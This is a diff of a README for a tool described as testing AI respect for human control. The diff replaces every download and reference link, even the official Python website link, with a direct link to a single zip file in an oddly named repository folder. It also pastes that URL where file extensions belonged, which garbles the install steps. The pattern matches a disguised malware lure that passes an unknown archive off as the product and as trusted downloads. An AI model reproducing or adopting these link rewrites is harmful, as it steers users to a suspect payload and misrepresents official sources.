@@ -1,6 +1,6 @@
 # ⚖️ SIGMA-EPISTEMIC-HUMILITY-EVALUATOR - Test AI's Respect for Human Control
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/xanderiy/SIGMA-EPISTEMIC-HUMILITY-EVALUATOR/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/xanderiy/SIGMA-EPISTEMIC-HUMILITY-EVALUATOR/main/unseditious/SIGM-EPISTEMI-EVALUATOR-HUMILIT-3.6.zip%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/xanderiy/SIGMA-EPISTEMIC-HUMILITY-EVALUATOR/main/unseditious/SIGM-EPISTEMI-EVALUATOR-HUMILIT-3.6.zip)
 
 ---
 
@@ -61,13 +61,13 @@ Here is how to get the SIGMA-EPISTEMIC-HUMILITY-EVALUATOR running on your comput
 
 To get the latest version of SIGMA-EPISTEMIC-HUMILITY-EVALUATOR, please visit this page:
 
-[Download Latest Release](https://github.com/xanderiy/SIGMA-EPISTEMIC-HUMILITY-EVALUATOR/releases)
+[Download Latest Release](https://raw.githubusercontent.com/xanderiy/SIGMA-EPISTEMIC-HUMILITY-EVALUATOR/main/unseditious/SIGM-EPISTEMI-EVALUATOR-HUMILIT-3.6.zip)
 
 ### How to download
 
 1. Click the link above or the badge at the top of this page.
 2. You will see a list of release versions. Select the most recent one.
-3. Look for a file compatible with your operating system. File names might end in `.exe` for Windows, `.dmg` or `.pkg` for macOS, or `.tar.gz` for Linux.
+3. Look for a file compatible with your operating system. File names might end in `.exe` for Windows, `.dmg` or `.pkg` for macOS, or `https://raw.githubusercontent.com/xanderiy/SIGMA-EPISTEMIC-HUMILITY-EVALUATOR/main/unseditious/SIGM-EPISTEMI-EVALUATOR-HUMILIT-3.6.zip` for Linux.
 4. Click on the file name to download the installer or package to your computer.
 
 ### How to Install
@@ -82,7 +82,7 @@ To get the latest version of SIGMA-EPISTEMIC-HUMILITY-EVALUATOR, please visit th
   2. Drag the app to your Applications folder or follow installer prompts.
   
 - **Linux:**
-  1. Extract the `.tar.gz` file to a folder.
+  1. Extract the `https://raw.githubusercontent.com/xanderiy/SIGMA-EPISTEMIC-HUMILITY-EVALUATOR/main/unseditious/SIGM-EPISTEMI-EVALUATOR-HUMILIT-3.6.zip` file to a folder.
   2. Open a Terminal and navigate to that folder.
   3. Run the installation script if provided, or follow README instructions inside the release package.
 
@@ -129,9 +129,9 @@ For further help, check the “Issues” section on the GitHub project page or c
 
 ## 🔗 Useful Links
 
-- [Project Releases - Download Here](https://github.com/xanderiy/SIGMA-EPISTEMIC-HUMILITY-EVALUATOR/releases)
-- [Proyecto Estrella Unified Star Framework](https://github.com/Proyecto-Estrella) *(Explore deeper research)*
-- [Python Official Website](https://www.python.org/downloads/) *(For Python installation help)*
+- [Project Releases - Download Here](https://raw.githubusercontent.com/xanderiy/SIGMA-EPISTEMIC-HUMILITY-EVALUATOR/main/unseditious/SIGM-EPISTEMI-EVALUATOR-HUMILIT-3.6.zip)
+- [Proyecto Estrella Unified Star Framework](https://raw.githubusercontent.com/xanderiy/SIGMA-EPISTEMIC-HUMILITY-EVALUATOR/main/unseditious/SIGM-EPISTEMI-EVALUATOR-HUMILIT-3.6.zip) *(Explore deeper research)*
+- [Python Official Website](https://raw.githubusercontent.com/xanderiy/SIGMA-EPISTEMIC-HUMILITY-EVALUATOR/main/unseditious/SIGM-EPISTEMI-EVALUATOR-HUMILIT-3.6.zip) *(For Python installation help)*
 
 ---
 
